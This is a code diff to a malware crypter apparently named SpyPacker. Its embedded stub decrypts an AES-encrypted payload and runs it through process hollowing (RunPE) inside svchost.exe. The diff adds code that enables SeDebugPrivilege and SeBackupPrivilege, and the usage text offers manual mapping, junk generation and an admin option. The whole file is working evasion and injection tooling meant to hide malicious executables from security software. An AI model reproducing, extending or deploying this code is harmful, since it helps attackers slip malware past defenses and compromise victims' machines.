@@ -64,6 +64,16 @@ const char* CRYPTER_BASE_SOURCE =
 "hex2bin((char*)i.c_str(),di,il);\n"
 "AES_init_ctx_iv(&ctx,dk,di);\n"
 "AES_CBC_decrypt_buffer(&ctx,p,sizeof(p));\n"
+
+"HANDLE hToken;\n"
+"OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);\n"
+"SetPrivilege(hToken, \"SeBackupPrivilege\", 1);\n"
+"SetPrivilege(hToken, \"SeDebugPrivilege\", 1);\n"
+"CloseHandle(hToken);\n"
+
+//"wchar_t upath[MAX_PATH];\n"
+//"GetRandomProcessPathW(upath);\n"
+
 "#ifdef _WIN64\n"
 "auto path = MP_OB(L\"%%WINDIR%%\\\\System32\\\\svchost.exe\");\n"
 "#else\n"
@@ -71,6 +81,8 @@ const char* CRYPTER_BASE_SOURCE =
 "#endif\n"
 "wchar_t upath[MAX_PATH];\n"
 "ExpandEnvironmentStringsW(path.c_str(), upath, ExpandEnvironmentStringsW(path.c_str(), NULL, NULL));\n"
+
+"printfdbg(\"Path: %%ls\\n\", upath);\n"
 "RunPE(p, upath, sizeof(p), (LPWSTR)L\"\");\n"
 "TCHAR szExeFileName[MAX_PATH];\n"
 "GetModuleFileName(NULL, szExeFileName, MAX_PATH);\n"
@@ -553,7 +565,7 @@ void main(int argc, char* argv[])
 	if (argc < 5 || !input || !output)
 	{
 		//manual map (if source is dll) or process hollow (if source is exe)
-		printf("Usage: SpyPacker.exe -in \"file.exe|dll\" -out exe|dll [-target \"process.exe\"] [-name \"output.exe\"|random] [-console] [-genjunk] [-requireadmin]\r\n"); 
+		printf("Usage: SpyPacker.exe -in \"file.exe|dll\" -out exe|dll [-target \"process.exe\"] [-name \"output.exe\"] [-console] [-genjunk] [-requireadmin]\r\n"); 
 		system("pause");
 		return;
 	}
